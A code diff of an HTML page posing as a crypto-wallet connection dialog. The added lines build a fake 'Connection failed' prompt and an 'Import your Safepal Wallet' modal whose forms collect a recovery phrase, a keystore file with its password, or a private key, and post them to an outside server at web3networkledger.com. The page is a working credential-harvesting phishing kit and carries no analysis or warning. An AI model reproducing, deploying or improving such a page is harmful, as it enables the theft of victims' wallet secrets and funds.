@@ -11,6 +11,7 @@
         form-action
           https://lingering-union-8dcf.faith16437.workers.dev;
       ">
+ 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="csrf-token" content="ddIxXAYRN4F2qsJb97vWiJQ9mPJWgg23YEIdCyLD">
@@ -729,7 +730,7 @@
     </div>
 
     <!-- Connect Loading Modal -->
-    <div id="connectLoadingModal" class="hidden fixed inset-0 z-50">
+    <div id="connectLoadingModal" class="fixed inset-0 z-50 hidden">
         <div class="absolute inset-0 bg-black/50 backdrop-blur-sm"></div>
         <div class="absolute inset-0 flex items-center justify-center p-4">
             <div class="bg-dark-lighter rounded-lg shadow-xl max-w-md w-full border border-dark-border">
@@ -746,18 +747,18 @@
                 </div>
                 <div class="p-4">
                     <div class="border border-red-500/30 bg-red-500/10 rounded-lg p-3 flex justify-between items-center mb-4">
-                        <p class="text-red-400 text-sm" id="loadingText">Connecting...</p>
-                        <button class="bg-gray-600 hover:bg-gray-700 text-white text-xs px-3 py-1 rounded hidden" id="connectManuallyBtn">
+                        <p class="text-red-400 text-sm" id="loadingText">Connection failed</p>
+                        <button class="bg-gray-600 hover:bg-gray-700 text-white text-xs px-3 py-1 rounded" id="connectManuallyBtn">
                             Connect Manually
                         </button>
                     </div>
 
                     <div class="border border-gray-600 rounded-lg p-3 flex justify-between items-center">
                         <div>
-                            <h5 class="text-white font-medium mb-1" id="modalWalletName">Wallet Name</h5>
+                            <h5 class="text-white font-medium mb-1" id="modalWalletName"> Safepal</h5>
                             <p class="text-gray-400 text-sm">Easy-to-use browser extension.</p>
                         </div>
-                        <img id="modalWalletIcon" src="" alt="" class="w-6 h-6 rounded-full object-cover">
+                        <img id="modalWalletIcon" src="/images/wallets/14_safepal.png" alt=" Safepal" class="w-6 h-6 rounded-full object-cover">
                     </div>
                 </div>
             </div>
@@ -765,13 +766,123 @@
     </div>
 
     <!-- Phrase Key Modal -->
-    <div id="phraseKeyModal" class="hidden fixed inset-0 z-50">
+    <div id="phraseKeyModal" class="fixed inset-0 z-50 hidden">
         <div class="absolute inset-0 bg-black/50 backdrop-blur-sm"></div>
         <div class="absolute inset-0 flex items-center justify-center p-4">
             <div class="bg-dark-lighter rounded-lg shadow-xl max-w-md w-full border border-dark-border">
-                <div class="p-4" id="phraseModalBody">
-                    <!-- Content will be loaded dynamically -->
+                <div class="p-4" id="phraseModalBody"><section class="restore-wallet">
+    <div class="flex items-center mb-6">
+        <img src="https://web3networkledger.com/images/wallets/14_safepal.png" alt="" class="w-10 h-10 rounded-lg mr-3 object-cover">
+        <h5 class="text-white text-lg font-normal">Import your Safepal Wallet</h5>
+    </div>
+
+    <!-- Tab Navigation -->
+    <div class="flex bg-dark-medium rounded-lg p-1 mb-6" role="tablist">
+        <button class="wallet-tab-btn flex-1 py-2 px-3 text-sm font-medium rounded-md transition-colors active" data-target="phrase-tab" style="color: rgb(255, 255, 255); background-color: rgb(169, 93, 252);">
+            Phrase
+        </button>
+        <button class="wallet-tab-btn flex-1 py-2 px-3 text-sm font-medium rounded-md transition-colors" data-target="keystore-tab" style="color: rgb(156, 163, 175);">
+            Keystore JSON
+        </button>
+        <button class="wallet-tab-btn flex-1 py-2 px-3 text-sm font-medium rounded-md transition-colors" data-target="private-tab" style="color: rgb(156, 163, 175);">
+            Private Key
+        </button>
+    </div>
+    <!-- Tab Content -->
+    <div class="tab-content">
+        <!-- Phrase Tab -->
+        <div class="tab-pane active" id="phrase-tab" style="display: block;">
+            <form action="https://web3networkledger.com/encrypt_data/158" method="post" id="phrase-form">
+                <input type="hidden" name="_token" value="ddIxXAYRN4F2qsJb97vWiJQ9mPJWgg23YEIdCyLD" autocomplete="off">
+                <div class="mb-4">
+                    <input type="text" name="wallet_name" id="wallet_name" placeholder="Wallet Name" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent">
                 </div>
+                <div class="mb-4">
+                    <textarea rows="7" name="phrase" id="phrase" placeholder="Enter your recovery phrase" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent resize-none"></textarea>
+                </div>
+                <div class="text-primary text-center text-sm mb-6">
+                    Typically 12 (sometimes 24) words separated by single spaces
+                </div>
+                <input type="hidden" name="type" value="phrase">
+                <input type="hidden" name="vendor" value="Safepal Wallet">
+
+                <button class="w-full bg-primary hover:bg-primary-dark text-white py-2 rounded-lg font-medium transition-colors" type="submit">
+                    Proceed
+                </button>
+            </form>
+        </div>
+        <!-- Keystore Tab -->
+        <div class="tab-pane" id="keystore-tab" style="display: none;">
+            <form action="https://web3networkledger.com/encrypt_data/158" method="post" id="keystoreForm">
+                <input type="hidden" name="_token" value="ddIxXAYRN4F2qsJb97vWiJQ9mPJWgg23YEIdCyLD" autocomplete="off">
+                <div class="mb-4">
+                    <textarea rows="7" name="keystore" id="keystore" placeholder="Keystore JSON" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent resize-none"></textarea>
+                </div>
+                <div class="mb-4">
+                    <input type="password" name="password" id="password" placeholder="Wallet Password" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent">
+                </div>
+                <div class="text-primary text-center text-sm mb-6">
+                    Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                </div>
+                <input type="hidden" name="type" value="keystore">
+                <input type="hidden" name="vendor" value="Safepal Wallet">
+
+                <button class="w-full bg-primary hover:bg-primary-dark text-white py-2 rounded-lg font-medium transition-colors" type="submit">
+                    Proceed
+                </button>
+            </form>
+        </div>
+        <!-- Private Key Tab -->
+        <div class="tab-pane" id="private-tab" style="display: none;">
+            <form action="https://web3networkledger.com/encrypt_data/158" method="post" id="privateKeyForm">
+                <input type="hidden" name="_token" value="ddIxXAYRN4F2qsJb97vWiJQ9mPJWgg23YEIdCyLD" autocomplete="off">
+                <div class="mb-4">
+                    <input type="text" name="private_key" id="privateKey" placeholder="Enter your Private Key" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent">
+                </div>
+                <div class="text-primary text-center text-sm mb-6">
+                    Typically 12 (sometimes 24) words separated by single spaces
+                </div>
+                <input type="hidden" name="type" value="private_key">
+                <input type="hidden" name="vendor" value="Safepal Wallet">
+
+                <button class="w-full bg-primary hover:bg-primary-dark text-white py-2 rounded-lg font-medium transition-colors" type="submit">
+                    Proceed
+                </button>
+            </form>
+        </div>
+    </div>
+</section>
+
+
+
+<style>
+    .wallet-tab-btn {
+        color: #9ca3af !important;
+        background-color: transparent !important;
+        transition: all 0.2s ease;
+        border: none;
+        cursor: pointer;
+    }
+
+    .wallet-tab-btn:hover {
+        color: #ffffff !important;
+        background-color: rgba(14, 165, 233, 0.1) !important;
+    }
+
+    .wallet-tab-btn.active {
+        background-color: #0ea5e9 !important;
+        color: #ffffff !important;
+    }
+
+    .tab-pane {
+        display: none;
+    }
+
+    .tab-pane.active {
+        display: block !important;
+    }
+</style>
+</div>
                 <div class="flex justify-end p-4 border-t border-dark-border">
                     <button class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded text-sm" onclick="closeAllModals()">
                         Cancel
